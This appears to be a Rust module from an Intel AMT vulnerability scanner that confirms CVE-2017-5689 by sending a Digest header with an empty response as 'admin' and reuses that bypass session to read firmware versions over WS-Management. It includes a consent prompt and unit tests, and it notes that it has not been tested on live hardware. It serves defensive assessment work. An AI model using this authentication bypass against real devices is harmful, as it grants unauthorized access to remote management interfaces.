//! Opt-in active confirmation. Everything here reaches out and authenticates
//! against a device, so it runs only behind an explicit `--active`/credential
//! flag and a one-time consent acknowledgement. Both capabilities are
//! read-only:
//!
//!   1. CVE-2017-5689: send a Digest `Authorization` whose `response` is empty.
//!      Vulnerable firmware compares only as many bytes as the client supplied,
//!      so a zero-length response authenticates. A 200 to a protected GET is
//!      proof; a 401 is a patched box. Nothing is written.
//!
//!   2. Firmware version: a WS-Management enumeration of `CIM_SoftwareIdentity`,
//!      authenticated through the bypass above or with real credentials. The
//!      build number it returns feeds the deterministic comparison in `cve_db`,
//!      which is how the memory-corruption advisories are resolved without ever
//!      sending a malformed packet.
//!
//! NOTE: the request/digest/WS-Man code below is written to spec but has not
//! been exercised against live AMT hardware. Validate `confirm` against a real
//! device before trusting its verdicts.

use std::io::{self, Write};
use std::time::Duration;

use md5::{Digest, Md5};
use rustls_pki_types::ServerName;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

use crate::scanner::{build_tls_config, ScanConfig};

/// Default AMT administrator account targeted by the auth-bypass check.
const AMT_ADMIN_USER: &str = "admin";

#[derive(Debug, Clone)]
pub struct ActiveConfig {
    /// `--active`: permit the CVE-2017-5689 empty-response auth-bypass check.
    pub enabled: bool,
    /// `--amt-user` / `--amt-pass`: real credentials for version enumeration.
    pub creds: Option<(String, String)>,
    /// `--yes`: skip the interactive consent prompt (for scripted, already
    /// authorized runs).
    pub assume_yes: bool,
}

impl ActiveConfig {
    pub fn requested(&self) -> bool {
        self.enabled || self.creds.is_some()
    }
}

#[derive(Debug, Default, Clone)]
pub struct ActiveOutcome {
    /// `Some(true)` vulnerable, `Some(false)` patched, `None` not attempted.
    pub bypass_2017_5689: Option<bool>,
    /// Firmware build read over WS-Man, e.g. "11.8.55".
    pub firmware_version: Option<String>,
    /// How the version was obtained, for the evidence trail.
    pub version_source: Option<String>,
    pub notes: Vec<String>,
}

/// Prints the authorization notice and blocks for an explicit acknowledgement.
/// Returns `false` if the operator does not consent, in which case the caller
/// must not perform any active action.
pub fn consent_gate(cfg: &ActiveConfig) -> bool {
    if !cfg.requested() {
        return false;
    }
    eprintln!();
    eprintln!("  ACTIVE CONFIRMATION REQUESTED");
    eprintln!("  This will authenticate to detected AMT hosts:");
    if cfg.enabled {
        eprintln!("    - CVE-2017-5689 auth-bypass check (empty Digest response, read-only GET)");
    }
    if cfg.creds.is_some() {
        eprintln!("    - WS-Management version read using the supplied credentials");
    }
    eprintln!("  Only proceed against systems you own or are explicitly authorized to assess.");
    if cfg.assume_yes {
        eprintln!("  --yes supplied: proceeding.");
        return true;
    }
    eprint!("  Type 'yes' to confirm authorization: ");
    let _ = io::stderr().flush();
    let mut line = String::new();
    if io::stdin().read_line(&mut line).is_err() {
        return false;
    }
    matches!(line.trim().to_ascii_lowercase().as_str(), "yes" | "y")
}

/// Runs the requested active checks against one AMT host and returns what was
/// observed. Never changes device state.
pub async fn confirm(host: &str, port: u16, tls: bool, acfg: &ActiveConfig, scfg: &ScanConfig) -> ActiveOutcome {
    let mut outcome = ActiveOutcome::default();

    // Bypass check: prove (or rule out) CVE-2017-5689 with an empty response.
    let mut bypass_ok = false;
    if acfg.enabled {
        match attempt_bypass(host, port, tls, scfg).await {
            Ok(true) => {
                outcome.bypass_2017_5689 = Some(true);
                bypass_ok = true;
            }
            Ok(false) => outcome.bypass_2017_5689 = Some(false),
            Err(e) => outcome.notes.push(format!("bypass check failed to complete: {e}")),
        }
    }

    // Pick an authentication method for the version read: a working bypass
    // session, otherwise supplied credentials.
    let auth: Option<Auth> = if bypass_ok {
        Some(Auth::Bypass)
    } else {
        acfg.creds.as_ref().map(|(u, p)| Auth::Creds(u.clone(), p.clone()))
    };

    if let Some(auth) = auth {
        match read_firmware_version(host, port, tls, &auth, scfg).await {
            Ok(Some(v)) => {
                outcome.version_source = Some(match auth {
                    Auth::Bypass => "unauthenticated bypass session".to_string(),
                    Auth::Creds(..) => "supplied credentials".to_string(),
                });
                outcome.firmware_version = Some(v);
            }
            Ok(None) => outcome.notes.push("WS-Man responded but no version string was parsed".to_string()),
            Err(e) => outcome.notes.push(format!("WS-Man version read failed: {e}")),
        }
    }

    outcome
}

// ============================================================
// Authentication
// ============================================================

enum Auth {
    /// CVE-2017-5689: authenticate as admin with an empty response hash.
    Bypass,
    Creds(String, String),
}

struct DigestChallenge {
    realm: String,
    nonce: String,
    qop: Option<String>,
    opaque: Option<String>,
}

fn parse_challenge(www_authenticate: &str) -> Option<DigestChallenge> {
    let realm = field(www_authenticate, "realm")?;
    let nonce = field(www_authenticate, "nonce")?;
    Some(DigestChallenge {
        realm,
        nonce,
        qop: field(www_authenticate, "qop"),
        opaque: field(www_authenticate, "opaque"),
    })
}

/// Extracts `key="value"` (quoted) from a header value.
fn field(header: &str, key: &str) -> Option<String> {
    let needle = format!("{key}=\"");
    let start = header.find(&needle)? + needle.len();
    let rest = &header[start..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

fn md5_hex(input: &str) -> String {
    let mut h = Md5::new();
    h.update(input.as_bytes());
    format!("{:x}", h.finalize())
}

/// A client nonce that is unpredictable enough for one Digest exchange without
/// pulling in an RNG dependency.
fn client_nonce() -> String {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    md5_hex(&format!("{nanos}:{:p}", &nanos as *const _))
}

/// Builds a Digest `Authorization` header. For `Auth::Bypass` the response is
/// deliberately empty (the CVE-2017-5689 primitive) while the qop/nc/cnonce
/// fields are still echoed, matching what real firmware expects to see.
fn digest_header(auth: &Auth, ch: &DigestChallenge, method: &str, uri: &str) -> String {
    let user: &str = match auth {
        Auth::Bypass => AMT_ADMIN_USER,
        Auth::Creds(u, _) => u.as_str(),
    };
    let cnonce = client_nonce();
    let nc = "00000001";

    let response = match auth {
        Auth::Bypass => String::new(),
        Auth::Creds(_, pass) => {
            let ha1 = md5_hex(&format!("{user}:{}:{pass}", ch.realm));
            let ha2 = md5_hex(&format!("{method}:{uri}"));
            match &ch.qop {
                Some(qop) => md5_hex(&format!("{ha1}:{}:{nc}:{cnonce}:{qop}:{ha2}", ch.nonce)),
                None => md5_hex(&format!("{ha1}:{}:{ha2}", ch.nonce)),
            }
        }
    };

    let mut header = format!(
        "Digest username=\"{user}\", realm=\"{}\", nonce=\"{}\", uri=\"{uri}\", algorithm=MD5, response=\"{response}\"",
        ch.realm, ch.nonce
    );
    if let Some(qop) = &ch.qop {
        header.push_str(&format!(", qop={qop}, nc={nc}, cnonce=\"{cnonce}\""));
    }
    if let Some(opaque) = &ch.opaque {
        header.push_str(&format!(", opaque=\"{opaque}\""));
    }
    header
}

// ============================================================
// CVE-2017-5689 bypass check
// ============================================================

async fn attempt_bypass(host: &str, port: u16, tls: bool, scfg: &ScanConfig) -> anyhow::Result<bool> {
    let path = "/index.htm";
    let challenge = get_challenge(host, port, tls, scfg, "GET", path, None)
        .await?
        .ok_or_else(|| anyhow::anyhow!("no Digest challenge offered on {path}"))?;

    let header = digest_header(&Auth::Bypass, &challenge, "GET", path);
    let resp = send(host, port, tls, scfg, "GET", path, &[("Authorization".into(), header)], None).await?;

    // A 200 to a protected page authenticated with an empty response hash is
    // the vulnerability; a 401 means the box rejected it (patched).
    Ok(resp.status == 200)
}

// ============================================================
// WS-Management version enumeration
// ============================================================

const WSMAN_PATH: &str = "/wsman";
const CIM_SOFTWARE_IDENTITY: &str =
    "http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_SoftwareIdentity";

async fn read_firmware_version(host: &str, port: u16, tls: bool, auth: &Auth, scfg: &ScanConfig) -> anyhow::Result<Option<String>> {
    let body = enumerate_envelope(host, port);
    let challenge = get_challenge(host, port, tls, scfg, "POST", WSMAN_PATH, Some(&body))
        .await?
        .ok_or_else(|| anyhow::anyhow!("no Digest challenge offered on {WSMAN_PATH}"))?;

    let header = digest_header(auth, &challenge, "POST", WSMAN_PATH);
    let extra = [
        ("Authorization".to_string(), header),
        ("Content-Type".to_string(), "application/soap+xml;charset=UTF-8".to_string()),
    ];
    let resp = send(host, port, tls, scfg, "POST", WSMAN_PATH, &extra, Some(&body)).await?;
    if resp.status != 200 {
        anyhow::bail!("WS-Man enumerate returned HTTP {}", resp.status);
    }
    Ok(pick_amt_version(&resp.body))
}

fn enumerate_envelope(host: &str, port: u16) -> String {
    let to = format!("http://{host}:{port}{WSMAN_PATH}");
    let msg_id = format!("uuid:{}", client_nonce());
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:e="http://schemas.xmlsoap.org/ws/2004/09/enumeration">
 <s:Header>
  <a:To>{to}</a:To>
  <w:ResourceURI>{CIM_SOFTWARE_IDENTITY}</w:ResourceURI>
  <a:ReplyTo><a:Address>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>
  <a:Action>http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate</a:Action>
  <w:MaxEnvelopeSize>153600</w:MaxEnvelopeSize>
  <a:MessageID>{msg_id}</a:MessageID>
  <w:OperationTimeout>PT60S</w:OperationTimeout>
 </s:Header>
 <s:Body>
  <e:Enumerate><w:OptimizeEnumeration/><w:MaxElements>999</w:MaxElements></e:Enumerate>
 </s:Body>
</s:Envelope>"#
    )
}

/// Collects every `VersionString` from the SOAP reply and returns the one that
/// best resembles an AMT firmware build (most dotted segments, plausible major).
fn pick_amt_version(soap: &str) -> Option<String> {
    let mut best: Option<String> = None;
    let mut best_segments = 0usize;
    let mut cursor = soap;
    while let Some(idx) = cursor.find("VersionString>") {
        let after = &cursor[idx + "VersionString>".len()..];
        let end = after.find('<').unwrap_or(after.len());
        let value = after[..end].trim();
        if let Some(segments) = amt_version_segments(value) {
            if segments > best_segments {
                best_segments = segments;
                best = Some(value.to_string());
            }
        }
        cursor = &after[end..];
    }
    best
}

/// Returns the dotted-segment count if `value` looks like an AMT build number
/// (2-4 numeric segments, major in the range AMT has ever shipped).
fn amt_version_segments(value: &str) -> Option<usize> {
    let parts: Vec<&str> = value.split('.').collect();
    if !(2..=4).contains(&parts.len()) {
        return None;
    }
    if !parts.iter().all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit())) {
        return None;
    }
    let major: u32 = parts[0].parse().ok()?;
    if !(6..=25).contains(&major) {
        return None;
    }
    Some(parts.len())
}

// ============================================================
// Minimal HTTP(S) client
// ============================================================

struct HttpResp {
    status: u16,
    www_authenticate: Option<String>,
    body: String,
}

/// Sends an unauthenticated request purely to harvest the `WWW-Authenticate`
/// challenge from the expected 401.
async fn get_challenge(host: &str, port: u16, tls: bool, scfg: &ScanConfig, method: &str, path: &str, body: Option<&str>) -> anyhow::Result<Option<DigestChallenge>> {
    let extra: Vec<(String, String)> = match body {
        Some(_) => vec![("Content-Type".to_string(), "application/soap+xml;charset=UTF-8".to_string())],
        None => vec![],
    };
    let resp = send(host, port, tls, scfg, method, path, &extra, body).await?;
    Ok(resp.www_authenticate.as_deref().and_then(parse_challenge))
}

async fn send(host: &str, port: u16, tls: bool, scfg: &ScanConfig, method: &str, path: &str, extra_headers: &[(String, String)], body: Option<&str>) -> anyhow::Result<HttpResp> {
    let raw = build_request(host, method, path, extra_headers, body, &scfg.user_agent);
    let tcp = timeout(scfg.connect_timeout, TcpStream::connect((host, port)))
        .await
        .map_err(|_| anyhow::anyhow!("connect timed out"))??;

    let bytes = if tls {
        let sn = ServerName::try_from(host.to_string()).map_err(|_| anyhow::anyhow!("bad server name"))?;
        let connector = tokio_rustls::TlsConnector::from(build_tls_config());
        let mut stream = timeout(scfg.connect_timeout, connector.connect(sn, tcp))
            .await
            .map_err(|_| anyhow::anyhow!("TLS handshake timed out"))??;
        stream.write_all(&raw).await?;
        read_all(&mut stream, scfg.read_timeout, scfg.max_body_bytes).await
    } else {
        let mut stream = tcp;
        stream.write_all(&raw).await?;
        read_all(&mut stream, scfg.read_timeout, scfg.max_body_bytes).await
    };

    Ok(parse_response(&bytes))
}

fn build_request(host: &str, method: &str, path: &str, extra_headers: &[(String, String)], body: Option<&str>, user_agent: &str) -> Vec<u8> {
    let mut req = format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: */*\r\nConnection: close\r\n"
    );
    for (k, v) in extra_headers {
        req.push_str(&format!("{k}: {v}\r\n"));
    }
    if let Some(b) = body {
        req.push_str(&format!("Content-Length: {}\r\n", b.len()));
    }
    req.push_str("\r\n");
    if let Some(b) = body {
        req.push_str(b);
    }
    req.into_bytes()
}

async fn read_all<S: AsyncRead + Unpin>(stream: &mut S, read_timeout: Duration, max_bytes: usize) -> Vec<u8> {
    let mut buf = Vec::new();
    let mut chunk = [0u8; 8192];
    while buf.len() < max_bytes {
        match timeout(read_timeout, stream.read(&mut chunk)).await {
            Ok(Ok(0)) | Ok(Err(_)) | Err(_) => break,
            Ok(Ok(n)) => buf.extend_from_slice(&chunk[..n]),
        }
    }
    buf
}

fn parse_response(raw: &[u8]) -> HttpResp {
    let text = String::from_utf8_lossy(raw);
    let (head, body_raw) = text.split_once("\r\n\r\n").unwrap_or((text.as_ref(), ""));

    let mut lines = head.split("\r\n");
    let status = lines
        .next()
        .and_then(|l| l.split_whitespace().nth(1))
        .and_then(|c| c.parse().ok())
        .unwrap_or(0);

    let mut www_authenticate = None;
    let mut chunked = false;
    for line in lines {
        if let Some((k, v)) = line.split_once(':') {
            let key = k.trim().to_ascii_lowercase();
            let val = v.trim();
            match key.as_str() {
                "www-authenticate" => www_authenticate = Some(val.to_string()),
                "transfer-encoding" if val.eq_ignore_ascii_case("chunked") => chunked = true,
                _ => {}
            }
        }
    }

    let body = if chunked { dechunk(body_raw) } else { body_raw.to_string() };
    HttpResp { status, www_authenticate, body }
}

/// Decodes HTTP/1.1 chunked transfer encoding; on any malformed length it
/// returns what was decoded so far rather than erroring.
fn dechunk(body: &str) -> String {
    let mut out = String::new();
    let mut rest = body;
    loop {
        let Some((size_line, after)) = rest.split_once("\r\n") else { break };
        let size = usize::from_str_radix(size_line.trim().split(';').next().unwrap_or("0").trim(), 16).unwrap_or(0);
        if size == 0 || size > after.len() {
            break;
        }
        out.push_str(&after[..size]);
        rest = after[size..].strip_prefix("\r\n").unwrap_or(&after[size..]);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dechunk_reassembles_multiple_chunks() {
        assert_eq!(dechunk("4\r\nWiki\r\n5\r\npedia\r\n0\r\n\r\n"), "Wikipedia");
    }

    #[test]
    fn dechunk_stops_on_terminator_chunk() {
        assert_eq!(dechunk("3\r\nabc\r\n0\r\n\r\n"), "abc");
    }

    #[test]
    fn field_extracts_quoted_value() {
        let h = r#"Digest realm="Digest:12345", nonce="abcXYZ", qop="auth""#;
        assert_eq!(field(h, "realm").as_deref(), Some("Digest:12345"));
        assert_eq!(field(h, "nonce").as_deref(), Some("abcXYZ"));
        assert_eq!(field(h, "qop").as_deref(), Some("auth"));
        assert!(field(h, "opaque").is_none());
    }

    #[test]
    fn parse_challenge_requires_realm_and_nonce() {
        let ch = parse_challenge(r#"Digest realm="R", nonce="N", qop="auth""#).unwrap();
        assert_eq!(ch.realm, "R");
        assert_eq!(ch.nonce, "N");
        assert_eq!(ch.qop.as_deref(), Some("auth"));
        assert!(parse_challenge(r#"Digest realm="R""#).is_none());
    }

    #[test]
    fn amt_version_segments_accepts_plausible_builds() {
        assert_eq!(amt_version_segments("11.8.55"), Some(3));
        assert_eq!(amt_version_segments("11.8.55.1096"), Some(4));
        assert_eq!(amt_version_segments("12.0"), Some(2));
    }

    #[test]
    fn amt_version_segments_rejects_implausible() {
        assert!(amt_version_segments("1.0").is_none()); // major below AMT range
        assert!(amt_version_segments("2020.1.1").is_none()); // major above AMT range
        assert!(amt_version_segments("11").is_none()); // too few segments
        assert!(amt_version_segments("a.b.c").is_none()); // non-numeric
    }

    #[test]
    fn pick_amt_version_prefers_the_amt_like_string() {
        let soap = "<x><VersionString>1.0</VersionString></x>\
                    <y><VersionString>11.8.50</VersionString></y>";
        assert_eq!(pick_amt_version(soap).as_deref(), Some("11.8.50"));
    }

    #[test]
    fn pick_amt_version_none_when_nothing_matches() {
        assert!(pick_amt_version("<a><VersionString>1.0</VersionString></a>").is_none());
    }

    #[test]
    fn parse_response_reads_status_and_challenge() {
        let raw = b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Digest realm=\"x\"\r\n\r\n";
        let r = parse_response(raw);
        assert_eq!(r.status, 401);
        assert_eq!(r.www_authenticate.as_deref(), Some("Digest realm=\"x\""));
    }

    #[test]
    fn parse_response_dechunks_body() {
        let raw = b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nWiki\r\n0\r\n\r\n";
        let r = parse_response(raw);
        assert_eq!(r.status, 200);
        assert_eq!(r.body, "Wiki");
    }

    #[test]
    fn bypass_digest_header_has_empty_response() {
        let ch = DigestChallenge { realm: "Digest:1".into(), nonce: "abc".into(), qop: None, opaque: None };
        let h = digest_header(&Auth::Bypass, &ch, "GET", "/index.htm");
        assert!(h.contains(r#"username="admin""#));
        assert!(h.contains(r#"response="""#), "bypass response hash must be empty: {h}");
    }

    #[test]
    fn creds_digest_header_computes_a_response() {
        let ch = DigestChallenge { realm: "Digest:1".into(), nonce: "abc".into(), qop: None, opaque: None };
        let h = digest_header(&Auth::Creds("root".into(), "pw".into()), &ch, "GET", "/index.htm");
        assert!(h.contains(r#"username="root""#));
        assert!(!h.contains(r#"response="""#), "credentialed response must not be empty: {h}");
    }
}
